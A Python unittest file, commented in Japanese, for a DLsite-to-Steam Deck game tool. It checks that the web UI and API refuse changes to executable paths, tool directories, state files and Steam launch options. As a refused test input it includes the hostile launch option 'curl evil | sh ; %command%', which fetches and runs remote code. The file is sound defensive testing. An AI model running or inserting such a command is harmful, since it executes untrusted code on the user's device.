"""場所とプログラムを指す設定を、画面や API から変えさせないこと。

合言葉が漏れても、ツールに任意のプログラムを実行させたり、ゲームを別の場所へ
落とさせたりできないようにするための守り。Flatpak のアプリは、ホームフォルダを
読めなくてもネットワーク越しに 127.0.0.1 へは届く。API で次を変えられると、
サンドボックスの外でプログラムを動かせてしまう。

* ``steam_executable`` … 「Steam を終了する」で実行される
* ``tool_dirs`` … 展開や表紙の描画で、そこにある bsdtar / rsvg-convert が実行される
* ``state_file`` … 偽の記録で、自分の exe を登録させたりパッチとして実行させたりできる
* ``install_dirs`` / ``download_dir`` … ゲームを自分の手元に落とさせて持ち出せる
* ``steam_launch_options`` … 任意のコマンドを Steam に登録できる

``install_dirs`` だけは、端末で承認済みの場所に限って画面から追加・削除できる。
"""

from __future__ import annotations

import inspect
import json
import os
import sys
import tempfile
import unittest
from dataclasses import asdict
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from dlsite_deck import config as config_module  # noqa: E402
from dlsite_deck import state, steam, webui  # noqa: E402
from dlsite_deck import server as deck_server  # noqa: E402
from tests import support  # noqa: E402

#: 鍵をかけるべき項目。ここを減らすときは、上の説明を読み直すこと。
EXPECTED_LOCKED = {
    "download_dir", "state_file", "cookie_file",
    "steam_userdata_dir", "steam_executable", "steam_launch_options",
    "tool_dirs", "acknowledged_paths",
}


class LockedKeysTest(unittest.TestCase):
    def test_the_expected_keys_are_locked(self):
        self.assertEqual(set(webui.LOCKED_CONFIG_KEYS), EXPECTED_LOCKED)

    def test_every_path_field_is_locked(self):
        """設定画面の「場所」の欄は、どれも鍵がかかっていること。

        新しく場所の項目を足したときに、鍵をかけ忘れないため。
        """
        for field_def in webui.CONFIG_FIELDS:
            if field_def["type"] == "path":
                with self.subTest(key=field_def["key"]):
                    self.assertTrue(field_def.get("locked"))


class SaveConfigTest(unittest.TestCase):
    def setUp(self):
        root = support.use_temp_config(self)
        self.tmp_root = root
        self.config_path = root / "config.json"

        cfg = config_module.Config()
        cfg.state_file = str(root / "state.json")
        cfg.download_dir = str(root / "downloads")
        cfg.install_dirs = [str(root / "games")]
        cfg.install_dir = str(root / "games")
        self.backend = webui.Backend(cfg)

    def _saved(self):
        return json.loads(self.config_path.read_text(encoding="utf-8"))

    def test_each_locked_key_is_refused(self):
        attempts = {
            "download_dir": "/home/deck/.var/app/evil/data/cache",
            "state_file": "/home/deck/.var/app/evil/data/state.json",
            "cookie_file": "/home/deck/.var/app/evil/data/cookies.txt",
            "steam_userdata_dir": "/home/deck/.var/app/evil/data/userdata",
            "steam_executable": "/home/deck/.var/app/evil/data/steam",
            "steam_launch_options": "curl evil | sh ; %command%",
            "tool_dirs": ["/home/deck/.var/app/evil/data/bin"],
            "acknowledged_paths": ["/home/deck/.var/app/evil/data"],
        }
        self.assertEqual(set(attempts), EXPECTED_LOCKED)

        for key, value in attempts.items():
            with self.subTest(key=key):
                before = getattr(self.backend.config, key)
                with self.assertRaises(webui.UiError) as caught:
                    self.backend.save_config({key: value})
                self.assertIn("config.json", str(caught.exception))
                self.assertEqual(getattr(self.backend.config, key), before)
                self.assertFalse(self.config_path.exists(), "断ったのに保存された")

    def test_a_locked_key_mixed_with_others_saves_nothing(self):
        """一部だけ保存して残りを断る、ということにならないこと。"""
        with self.assertRaises(webui.UiError):
            self.backend.save_config({
                "delete_archives": False,
                "tool_dirs": ["/home/deck/.var/app/evil/data/bin"],
            })
        self.assertTrue(self.backend.config.delete_archives)
        self.assertFalse(self.config_path.exists())

    def test_unchanged_locked_values_are_accepted(self):
        """今と同じ値なら受け流す。古い画面が全項目を送ってきても保存できるように。"""
        current = asdict(self.backend.config)
        values = {key: current[key] for key in EXPECTED_LOCKED}
        values["delete_archives"] = False
        self.backend.save_config(values)
        self.assertFalse(self._saved()["delete_archives"])

    def test_ordinary_settings_still_save(self):
        self.backend.save_config({"delete_archives": False, "long_vowel": "drop"})
        saved = self._saved()
        self.assertFalse(saved["delete_archives"])
        self.assertEqual(saved["long_vowel"], "drop")

    def test_choosing_the_default_install_dir_still_works(self):
        """既定のインストール先は、一覧の中から選ぶだけなので画面から変えられる。"""
        second = str(self.tmp_root / "sd")
        self.backend.config.install_dirs.append(second)
        self.backend.save_config({"install_dir": second})
        self.assertEqual(self._saved()["install_dir"], second)

    def test_the_default_install_dir_must_be_in_the_list(self):
        with self.assertRaises(webui.UiError):
            self.backend.save_config({"install_dir": "/home/deck/.var/app/evil/data"})

    def test_saving_no_longer_approves_outside_paths(self):
        """画面での保存を、プロジェクト外への書き込みの承認とみなさないこと。"""
        self.backend.save_config({"delete_archives": False})
        self.assertEqual(self._saved()["acknowledged_paths"], [])


class InstallDirsTest(unittest.TestCase):
    """インストール先の一覧は、承認済みの場所に限って画面から変えられること。"""

    def setUp(self):
        self.root = support.use_temp_config(self)
        self.config_path = self.root / "config.json"

        self.games = str(self.root / "games")
        self.sd = str(self.root / "sd" / "dlsite_games")
        cfg = config_module.Config()
        cfg.state_file = str(self.root / "state.json")
        cfg.download_dir = str(self.root / "downloads")
        cfg.install_dirs = [self.games]
        cfg.install_dir = self.games
        # 端末で承認済みの SD カード (一覧からは外してある)
        cfg.acknowledged_paths = [self.sd]
        self.backend = webui.Backend(cfg)

    def _saved(self):
        return json.loads(self.config_path.read_text(encoding="utf-8"))

    def _refused(self, dirs):
        """断られること。

        今の既定 (games) を必ず一覧に含めて送る。含めないと「既定が一覧に無い」
        という別の理由で断られ、承認の確認が効いていなくても通ってしまう。
        """
        with self.assertRaises(webui.UiError) as caught:
            self.backend.save_config({"install_dirs": [self.games, *dirs]})
        self.assertFalse(self.config_path.exists(), "断ったのに保存された")
        return str(caught.exception)

    # -- 通るもの -------------------------------------------------------

    def test_an_approved_place_can_be_added(self):
        self.backend.save_config({"install_dirs": [self.games, self.sd]})
        self.assertEqual(self._saved()["install_dirs"], [self.games, self.sd])

    def test_a_place_can_be_removed(self):
        self.backend.config.install_dirs = [self.games, self.sd]
        self.backend.save_config({"install_dirs": [self.sd], "install_dir": self.sd})
        self.assertEqual(self._saved()["install_dirs"], [self.sd])

    def test_the_project_games_folder_is_always_allowed(self):
        default = str(config_module.PROJECT_ROOT / "games")
        self.backend.save_config({"install_dirs": [self.games, default]})
        self.assertIn(default, self._saved()["install_dirs"])

    def test_the_spelling_is_aligned_to_the_approved_one(self):
        """末尾の区切りなどは承認したときの表記にそろえる。既定の選択も同じ。"""
        written = self.sd + os.sep
        self.backend.save_config({"install_dirs": [written], "install_dir": written})
        saved = self._saved()
        self.assertEqual(saved["install_dirs"], [self.sd])
        self.assertEqual(saved["install_dir"], self.sd)

    # -- 断るもの -------------------------------------------------------

    def test_an_unapproved_place_is_refused(self):
        message = self._refused(["/home/deck/.var/app/evil/data/games"])
        self.assertIn("承認", message)
        self.assertIn("config.json", message)

    def test_climbing_out_of_an_approved_place_is_refused(self):
        """「承認済みの場所の中」を許すと、.. で抜け出せてしまう。"""
        self._refused([os.path.join(self.sd, "..", "..")])

    def test_inside_an_approved_place_is_refused(self):
        """場所そのものだけを許す。中のフォルダも承認とはみなさない。"""
        self._refused([os.path.join(self.sd, "inner")])

    def test_the_tool_itself_is_refused(self):
        """プロジェクトの中でも、ツール自身のプログラムの置き場は選べない。"""
        self._refused([str(config_module.PROJECT_ROOT / "dlsite_deck")])
        self._refused([str(config_module.PROJECT_ROOT)])

    def test_a_refused_list_saves_nothing_else(self):
        with self.assertRaises(webui.UiError):
            self.backend.save_config({
                "delete_archives": False,
                "install_dirs": [self.games, "/home/deck/.var/app/evil/data/games"],
            })
        self.assertTrue(self.backend.config.delete_archives)

    def test_approval_cannot_be_added_from_the_screen(self):
        """承認の一覧そのものは画面から増やせないこと (増やせたら意味がない)。"""
        with self.assertRaises(webui.UiError):
            self.backend.save_config({
                "acknowledged_paths": [self.sd, "/home/deck/.var/app/evil/data"],
                "install_dirs": [self.games, "/home/deck/.var/app/evil/data"],
            })

    # -- 画面への案内 -----------------------------------------------------

    def test_the_screen_is_told_what_it_can_add(self):
        choices = self.backend.config_json()["install_dir_choices"]
        self.assertIn(self.sd, choices)
        self.assertIn(self.games, choices)
        self.assertIn(str(config_module.PROJECT_ROOT / "games"), choices)
        self.assertNotIn(str(config_module.PROJECT_ROOT), choices)


class RegisterLaunchOptionsTest(unittest.TestCase):
    """登録の起動オプションは、画面や API から指定させないこと。"""

    def test_register_does_not_take_launch_options(self):
        parameters = inspect.signature(webui.Backend.register_steam).parameters
        self.assertNotIn("launch_options", parameters)

    def test_the_route_drops_launch_options(self):
        called = {}

        class Recorder:
            def register_steam(self, *args, **kwargs):
                called["args"], called["kwargs"] = args, kwargs
                return {}

        deck_server.POST_ROUTES["/api/steam/register"](Recorder(), {
            "work_id": "RJ1", "executable": "a.exe", "title": "T",
            "launch_options": "curl evil | sh ; %command%",
        })
        self.assertEqual(called["args"], ("RJ1", "a.exe", "T"))
        self.assertEqual(called["kwargs"], {})


class LaunchOptionsSourceTest(unittest.TestCase):
    """付く起動オプションは、Steam の現在値か config.json の既定値だけ。"""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        root = Path(self.tmp.name)
        self.userdata = root / "userdata"
        self.config_dir = self.userdata / "123" / "config"
        self.config_dir.mkdir(parents=True)

        cfg = config_module.Config()
        cfg.steam_userdata_dir = str(self.userdata)
        cfg.steam_launch_options = "LANG=ja_JP.UTF-8 %command%"
        self.backend = webui.Backend(cfg)
        self.entry = state.InstalledWork(id="RJ1", title="ゲーム", directory=str(root))

    def _register_in_steam(self, name, options):
        document = {"shortcuts": {}}
        steam.upsert_shortcut(document, steam.Shortcut(
            app_name=name, exe='"/g/a.exe"', start_dir='"/g"', launch_options=options))
        steam.save_shortcuts(self.config_dir / "shortcuts.vdf", document)

    def test_unregistered_uses_the_config_default(self):
        self.assertEqual(
            self.backend._launch_options_for(self.entry),
            ("LANG=ja_JP.UTF-8 %command%", "config"))

    def test_registered_keeps_what_steam_has(self):
        self._register_in_steam("ゲーム", "PROTON_LOG=1 %command%")
        self.assertEqual(
            self.backend._launch_options_for(self.entry),
            ("PROTON_LOG=1 %command%", "steam"))

    def test_registered_with_none_stays_none(self):
        """Steam で空にしてあるものに、既定値を足さないこと。"""
        self._register_in_steam("ゲーム", "")
        self.assertEqual(self.backend._launch_options_for(self.entry), ("", "steam"))


class KeepLaunchOptionsTest(unittest.TestCase):
    """steam.register の keep_launch_options。"""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.userdata = Path(self.tmp.name) / "userdata"
        self.config_dir = self.userdata / "123" / "config"
        self.config_dir.mkdir(parents=True)
        self.exe = Path(self.tmp.name) / "a.exe"
        self.exe.write_bytes(b"MZ")

    def _options(self, name="ゲーム"):
        document = steam.load_shortcuts(self.config_dir / "shortcuts.vdf")
        for entry in document["shortcuts"].values():
            if steam.get_field(entry, "AppName") == name:
                return steam.get_field(entry, "LaunchOptions")
        return None

    def test_new_registration_gets_the_options(self):
        steam.register(self.userdata, "ゲーム", self.exe,
                       launch_options="LANG=ja_JP.UTF-8 %command%",
                       keep_launch_options=True)
        self.assertEqual(self._options(), "LANG=ja_JP.UTF-8 %command%")

    def test_existing_options_are_left_alone(self):
        steam.register(self.userdata, "ゲーム", self.exe, launch_options="元の値 %command%")
        steam.register(self.userdata, "ゲーム", self.exe,
                       launch_options="上書きしようとした値 %command%",
                       keep_launch_options=True)
        self.assertEqual(self._options(), "元の値 %command%")

    def test_without_the_flag_it_still_overwrites(self):
        """コマンドラインからの登録は従来どおり (端末の利用者が指示したもの)。"""
        steam.register(self.userdata, "ゲーム", self.exe, launch_options="元の値 %command%")
        steam.register(self.userdata, "ゲーム", self.exe, launch_options="新しい値 %command%")
        self.assertEqual(self._options(), "新しい値 %command%")


class PageTest(unittest.TestCase):
    """画面が、鍵のかかった項目と起動オプションを送らないこと。"""

    def test_locked_fields_are_not_collected(self):
        self.assertIn("if (f.locked) return;", deck_server.PAGE)

    def test_register_does_not_send_launch_options(self):
        start = deck_server.PAGE.index('post("/api/steam/register"')
        body = deck_server.PAGE[start:start + 400]
        self.assertNotIn("launch_options", body)


if __name__ == "__main__":
    unittest.main()
